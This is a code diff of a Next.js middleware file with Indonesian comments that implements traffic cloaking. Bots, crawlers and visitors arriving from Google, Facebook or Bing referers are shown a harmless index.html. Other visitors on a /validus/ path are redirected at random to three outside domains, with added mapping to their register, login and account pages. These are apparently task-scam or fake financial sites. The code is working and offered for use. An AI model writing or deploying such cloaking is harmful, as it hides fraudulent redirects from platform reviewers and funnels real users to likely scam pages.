@@ -4,17 +4,14 @@ import { NextResponse } from 'next/server';
 // 1. KONFIGURASI KHUSUS ANDA
 // ===============================================
 
-// Path yang akan MENGAKTIFKAN PENGALIHAN. Kita pastikan path ini selalu diakhiri /
-let ACTIVE_REDIRECT_PATH = '/validus/'; 
-if (!ACTIVE_REDIRECT_PATH.endsWith('/')) {
-    ACTIVE_REDIRECT_PATH += '/';
-}
+// JALUR UTAMA YANG MENGAKTIFKAN PENGALIHAN
+const ACTIVE_REDIRECT_PATH = '/validus/'; 
 
-// URL TARGET ANDA (Pengalihan Acak)
-const TARGET_URLS = [
-    "https://ventureidven.com/",
-    "https://akunfinansial.com/",
-    "https://platformtugas.com/"
+// URL TARGET ACARA (3 Domain Dasar, TIDAK termasuk path)
+const TARGET_DOMAINS = [
+    "https://ventureidven.com",
+    "https://akunfinansial.com",
+    "https://platformtugas.com"
 ];
 
 // USER AGENT BOT/CRAWLER
@@ -26,20 +23,19 @@ const SUSPICIOUS_REFERERS = ["google.com", "facebook.com", "bing.com"];
 
 export default function middleware(request) {
     const url = new URL(request.url);
+    const pathname = url.pathname.toLowerCase();
     const userAgent = request.headers.get('user-agent')?.toLowerCase() || '';
     const referer = request.headers.get('referer')?.toLowerCase() || '';
 
     let isBot = false;
 
-    // A. Pengecekan User Agent
+    // A. Pengecekan Bot/Crawler
     for (const bot of BOT_AGENTS) {
         if (userAgent.includes(bot)) {
             isBot = true;
             break;
         }
     }
-
-    // B. Pengecekan Referer (Jika ada referer mencurigakan, anggap sebagai Bot)
     for (const ref of SUSPICIOUS_REFERERS) {
         if (referer.includes(ref)) {
             isBot = true;
@@ -47,28 +43,53 @@ export default function middleware(request) {
         }
     }
 
-    // C. Pengecekan Path (Jalur URL)
-    const isCorrectPath = url.pathname.startsWith(ACTIVE_REDIRECT_PATH);
+    // B. Pengecekan Path: Apakah dimulai dengan /validus/
+    const isCorrectBasePath = pathname.startsWith(ACTIVE_REDIRECT_PATH);
 
 
     // ===============================================
     // 3. EKSEKUSI
     // ===============================================
-
+    
     // KONDISI 1: JALUR BENAR DAN BUKAN BOT (HUMAN)
-    if (isCorrectPath && !isBot) {
-        // Lakukan Pengalihan Acak 302
-        const randomIndex = Math.floor(Math.random() * TARGET_URLS.length);
-        const redirectUrl = TARGET_URLS[randomIndex];
+    if (isCorrectBasePath && !isBot) {
+        
+        // 1. Pilih Domain Dasar Secara Acak
+        const randomIndex = Math.floor(Math.random() * TARGET_DOMAINS.length);
+        const randomBaseDomain = TARGET_DOMAINS[randomIndex];
 
-        // Header response untuk Redirect 302
-        return NextResponse.redirect(redirectUrl, 302);
+        // 2. Ambil Sisa Path Setelah '/validus/'
+        // Contoh: '/validus/daftar' -> '/daftar'
+        const remainingPath = pathname.substring(ACTIVE_REDIRECT_PATH.length - 1); // Hasilnya: /daftar atau /home dll.
+
+        // 3. Gabungkan Domain Dasar + Sisa Path
+        // randomBaseDomain (misal: https://ventureidven.com) + remainingPath (misal: /daftar)
+        // Hasilnya: https://ventureidven.com/daftar
+        let finalRedirectUrl = randomBaseDomain + remainingPath;
+
+        // 4. Lakukan Penggantian (Path Mapping)
+        // Kita harus mengubah path: /daftar -> /index/user/register
+
+        if (finalRedirectUrl.endsWith('/daftar')) {
+            finalRedirectUrl = finalRedirectUrl.replace('/daftar', '/index/user/register');
+        } else if (finalRedirectUrl.endsWith('/home')) {
+            finalRedirectUrl = finalRedirectUrl.replace('/home', '/index/my/index');
+        } else if (finalRedirectUrl.endsWith('/login')) {
+            finalRedirectUrl = finalRedirectUrl.replace('/login', '/index/user/login');
+        } 
+        
+        // KONDISI KHUSUS: Jika hanya /validus/, kita arahkan ke root domain tujuan.
+        else if (finalRedirectUrl.endsWith('/validus/')) {
+            finalRedirectUrl = randomBaseDomain + '/';
+        }
+
+
+        // Lakukan Pengalihan 302
+        return NextResponse.redirect(finalRedirectUrl, 302);
     } 
-
+    
     // KONDISI 2: JALUR SALAH ATAU TERDETEKSI BOT
-    // Tampilkan Konten Aman (melalui Rewrite ke index.html)
-
-    // Pastikan konten aman Anda ada di public/index.html
+    // Tampilkan Konten Aman
     return NextResponse.rewrite(new URL('/index.html', url)); 
 }
 
